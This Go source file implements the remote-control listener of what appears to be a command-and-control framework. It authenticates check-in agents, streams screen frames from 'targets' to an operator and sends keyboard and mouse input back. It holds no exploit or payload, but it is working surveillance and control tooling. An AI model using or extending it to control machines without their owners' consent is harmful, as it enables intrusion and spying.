package server

// RCPListener is the long-lived, sleep-independent channel used by "remote
// control". Agents connect to it after receiving CmdRCPConnect, authenticate
// with the same session keys used for checkins, then stream screen frames up
// while receiving mouse/keyboard input down. The port is chosen automatically
// by the OS and delivered to the agent inside the connect task.

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"

	"github.com/user/wisp/shared/protocol"
)

// rcpIdleTimeout closes a channel that produced no traffic for this long.
// Kept generous: high-resolution frames take a while to transfer over KCP
// under heavy retransmission, and a false timeout would freeze the picture.
const rcpIdleTimeout = 60 * time.Second

// rcpPingInterval is how often the server sends a keepalive ping to an agent.
// The agent's read loop enforces its own deadline, so while the operator is
// merely watching (no input events flowing) the ping keeps the channel alive;
// without it the agent would tear the channel down after 45s of silence.
const rcpPingInterval = 10 * time.Second

// rcpConn is one authenticated agent connection on the RCP channel.
type rcpConn struct {
	mu        sync.Mutex
	conn      net.Conn
	sessionID string
	keys      *protocol.SessionKeys
	closed    bool
}

func (c *rcpConn) write(pkt *protocol.Packet) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.closed {
		return fmt.Errorf("connection closed")
	}
	return protocol.WritePacket(c.conn, pkt)
}

func (c *rcpConn) close() {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.closed {
		return
	}
	c.closed = true
	_ = c.conn.Close()
}

// RCPListener manages the RCP accept loop and per-session connections.
// It can listen over plain TCP or KCP (UDP); the agent picks the transport per
// remote-control window, so the channel type is chosen on the fly.
type RCPListener struct {
	mu      sync.Mutex
	srv     *Server
	ln      net.Listener
	port    int
	proto   string // "tcp" or "kcp"
	running bool
	conns   map[string]*rcpConn
}

func newRCPListener(srv *Server) *RCPListener {
	return &RCPListener{srv: srv, proto: "kcp", conns: make(map[string]*rcpConn)}
}

// Ensure starts the RCP listener for the given transport ("kcp" or "tcp") if it
// is not already running and returns the chosen port (0 lets the OS pick a free
// port). If the running listener uses a different transport it is restarted.
func (l *RCPListener) Ensure(proto string) (int, error) {
	if proto == "" {
		proto = "kcp"
	}
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.running {
		if l.proto == proto {
			return l.port, nil
		}
		l.stopLocked()
	}
	return l.startLocked(proto)
}

// startLocked binds and starts the accept loop. Caller must hold l.mu.
func (l *RCPListener) startLocked(proto string) (int, error) {
	var ln net.Listener
	var err error
	if proto == "kcp" {
		ln, err = kcp.ListenWithOptions(":0", nil, 0, 0)
	} else {
		ln, err = net.Listen("tcp", ":0")
	}
	if err != nil {
		return 0, fmt.Errorf("rcp %s listen: %w", proto, err)
	}
	l.ln = ln
	switch a := ln.Addr().(type) {
	case *net.TCPAddr:
		l.port = a.Port
	case *net.UDPAddr:
		l.port = a.Port
	}
	l.proto = proto
	l.running = true

	log.Printf("[RCP] Listening on :%d (%s)", l.port, proto)
	go l.acceptLoop(ln)
	return l.port, nil
}

// stopLocked shuts down the listener and all active channels. Caller must hold l.mu.
func (l *RCPListener) stopLocked() {
	l.running = false
	if l.ln != nil {
		_ = l.ln.Close()
	}
	for _, rc := range l.conns {
		rc.close()
	}
	l.conns = make(map[string]*rcpConn)
}

// Port returns the active port, or 0 when not running.
func (l *RCPListener) Port() int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.port
}

func (l *RCPListener) acceptLoop(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			l.mu.Lock()
			running := l.running
			l.mu.Unlock()
			if !running {
				return
			}
			continue
		}
		// KCP sessions get fast mode (low latency screen streaming).
		tuneKCPConn(conn)
		go l.handleConn(conn)
	}
}

// handleConn performs the handshake and then relays frames to the frontend and
// input back to the agent until the channel is closed or idle.
func (l *RCPListener) handleConn(conn net.Conn) {
	defer conn.Close()

	_ = conn.SetReadDeadline(time.Now().Add(rcpIdleTimeout))

	// 1. Handshake: Hello with agentID + RSA-encrypted challenge
	hello, err := protocol.ReadPacket(conn)
	if err != nil {
		return
	}
	if hello.Type != protocol.TypeRCPHello {
		log.Printf("[RCP] dropped connection: expected hello, got type %d", hello.Type)
		return
	}
	agentID, encChallenge, err := protocol.ParseRCPHello(hello.Payload)
	if err != nil {
		return
	}
	sessionID := hex.EncodeToString(agentID)
	sess := l.srv.GetSession(sessionID)
	if sess == nil || sess.Keys == nil {
		log.Printf("[RCP] rejected connection for unknown session %s", sessionID)
		return
	}

	challenge, err := protocol.RSADecrypt(l.srv.GetRSAPrivateKey(), encChallenge)
	if err != nil {
		log.Printf("[RCP] challenge decrypt failed for %s", sessionID)
		return
	}
	ack, err := sess.Keys.Encrypt(challenge)
	if err != nil {
		return
	}
	if err := protocol.WritePacket(conn, &protocol.Packet{Type: protocol.TypeRCPAck, Payload: ack}); err != nil {
		return
	}

	// 2. Register the connection
	rc := &rcpConn{conn: conn, sessionID: sessionID, keys: sess.Keys}
	l.mu.Lock()
	if old, ok := l.conns[sessionID]; ok {
		old.close()
	}
	l.conns[sessionID] = rc
	l.mu.Unlock()
	log.Printf("[RCP] session %s connected", sessionID)

	defer func() {
		rc.close()
		l.mu.Lock()
		if l.conns[sessionID] == rc {
			delete(l.conns, sessionID)
		}
		l.mu.Unlock()
		log.Printf("[RCP] session %s disconnected", sessionID)
	}()

	// 3. Relay loop
	stopPing := make(chan struct{})
	defer close(stopPing)
	go l.keepaliveLoop(rc, conn, stopPing)

	for {
		_ = conn.SetReadDeadline(time.Now().Add(rcpIdleTimeout))
		pkt, err := protocol.ReadPacket(conn)
		if err != nil {
			return
		}
		switch pkt.Type {
		case protocol.TypeRCPFrame:
			// Frame payloads are encrypted with the session keys so screen
			// content cannot be sniffed on the wire.
			dec, err := rc.keys.Decrypt(pkt.Payload)
			if err != nil {
				return
			}
			l.relayFrame(sessionID, dec)
		case protocol.TypeRCPPing:
			// keepalive — nothing to do
		case protocol.TypeRCPError:
			// The agent cannot capture the screen (e.g. no X11 display on a
			// Linux target). Relay the reason to the frontend before closing.
			dec, err := rc.keys.Decrypt(pkt.Payload)
			if err == nil && l.srv.emitter != nil {
				l.srv.emitter.EmitEvent("rc:error", map[string]string{
					"session_id": sessionID,
					"error":      string(dec),
				})
			}
			return
		case protocol.TypeRCPClose:
			return
		default:
			return
		}
	}
}

// keepaliveLoop sends TypeRCPPing packets at rcpPingInterval so the agent's
// read deadline never expires while the operator is only watching the stream
// (no input events are flowing server→agent). The ping write is bounded by a
// short deadline so a congested channel cannot stall the relay loop.
func (l *RCPListener) keepaliveLoop(rc *rcpConn, conn net.Conn, stop <-chan struct{}) {
	t := time.NewTicker(rcpPingInterval)
	defer t.Stop()
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
			if err := rc.write(&protocol.Packet{Type: protocol.TypeRCPPing}); err != nil {
				return
			}
		}
	}
}

func (l *RCPListener) relayFrame(sessionID string, payload []byte) {
	frame, err := protocol.DecodeRCPFrame(payload)
	if err != nil {
		return
	}
	if l.srv.emitter != nil {
		l.srv.emitter.EmitEvent("rc:frame", map[string]string{
			"session_id": sessionID,
			"seq":        fmt.Sprintf("%d", frame.Seq),
			"w":          fmt.Sprintf("%d", frame.W),
			"h":          fmt.Sprintf("%d", frame.H),
			"data_url":   "data:image/jpeg;base64," + base64.StdEncoding.EncodeToString(frame.JPEG),
		})
	}
}

// SendInput forwards a mouse / keyboard event to the agent on its RCP channel.
// The payload is encrypted with the session keys.
func (l *RCPListener) SendInput(sessionID string, msg []byte) error {
	l.mu.Lock()
	rc := l.conns[sessionID]
	l.mu.Unlock()
	if rc == nil {
		return fmt.Errorf("remote control channel for %s is not connected", sessionID)
	}
	enc, err := rc.keys.Encrypt(msg)
	if err != nil {
		return err
	}
	return rc.write(&protocol.Packet{Type: protocol.TypeRCPInput, Payload: enc})
}

// CloseChannel closes the channel for a session.
func (l *RCPListener) CloseChannel(sessionID string) {
	l.mu.Lock()
	rc := l.conns[sessionID]
	delete(l.conns, sessionID)
	l.mu.Unlock()
	if rc != nil {
		_ = rc.write(&protocol.Packet{Type: protocol.TypeRCPClose})
		rc.close()
	}
}

// Stop shuts down the listener and all active channels.
func (l *RCPListener) Stop() {
	l.mu.Lock()
	defer l.mu.Unlock()
	if !l.running {
		return
	}
	l.stopLocked()
}
